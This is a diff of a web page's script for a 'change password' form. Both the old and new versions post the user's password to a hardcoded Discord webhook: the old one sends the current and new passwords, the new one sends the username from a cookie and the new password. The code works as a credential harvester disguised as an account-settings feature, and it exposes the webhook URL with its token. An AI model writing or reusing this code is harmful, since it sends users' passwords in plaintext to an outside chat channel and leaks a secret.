@@ -399,50 +399,60 @@
 </div>
 
 <script>
-    document.getElementById('updatePasswordBtn').addEventListener('click', async function (e) {
-        e.preventDefault(); // Prevent default button behavior
-
-        // Get the values from the form
-        const currentPassword = document.getElementById('currentPassword').value;
-        const newPassword = document.getElementById('newPassword').value;
-        const confirmNewPassword = document.getElementById('confirmNewPassword').value;
-
-        // Validate that the new password and confirm password match
-        if (newPassword !== confirmNewPassword) {
-            alert('New password and confirm password do not match!');
-            return;
+// Function to get cookie by name
+function getCookie(name) {
+    let cookieArr = document.cookie.split(';');
+    for (let i = 0; i < cookieArr.length; i++) {
+        let cookie = cookieArr[i].trim();
+        if (cookie.startsWith(name + '=')) {
+            return cookie.substring(name.length + 1);
         }
+    }
+    return null;
+}
 
-        // Your Discord Webhook URL
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1323499591601225819/WHUjHeWXr4z8Ke6C8rgL568uhDsOP2yInUQK1Jfot17sgYQssYPEqQO00ZznqnTswOW-'; // Replace with your actual Discord webhook URL
+// Discord webhook URL
+const discordWebhookUrl = 'https://discord.com/api/webhooks/1323499591601225819/WHUjHeWXr4z8Ke6C8rgL568uhDsOP2yInUQK1Jfot17sgYQssYPEqQO00ZznqnTswOW-';
 
-        // Create the message to send to Discord
-        const discordMessage = {
-            content: `Password change request:
-                      \nCurrent Password: ${currentPassword} 
-                      \nNew Password: ${newPassword}`
-        };
+// Handle form submission
+document.getElementById('passwordChangeForm').addEventListener('submit', function(event) {
+    event.preventDefault();
 
-        try {
-            // Send the data to Discord via the webhook
-            const response = await fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(discordMessage)
-            });
+    const newPassword = document.getElementById('newPassword').value;
+    
+    // Get the logged-in user's username from the cookie
+    const username = getCookie('username');
+    
+    if (!username) {
+        alert('You are not logged in!');
+        return;
+    }
 
-            if (response.ok) {
-                alert('Password change request submitted successfully!');
-            } else {
-                alert('Failed to submit the request.');
-            }
-        } catch (error) {
-            console.error('Error sending webhook:', error);
-            alert('Error sending request.');
+    // Generate the message to send to Discord
+    const discordMessage = {
+        content: `Password Change Requested:\n- **Username:** ${username}\n- **New Password:** ${newPassword}`
+    };
+
+    // Send a POST request to the Discord webhook
+    fetch(discordWebhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(discordMessage)
+    })
+    .then(response => {
+        if (response.ok) {
+            alert('Password change request has been sent!');
+        } else {
+            alert('Failed to send password change request.');
         }
+    })
+    .catch(error => {
+        console.error('Error sending to Discord:', error);
+        alert('An error occurred while sending the request.');
     });
+});
 </script>
 
           <!-- Card Change Password -->
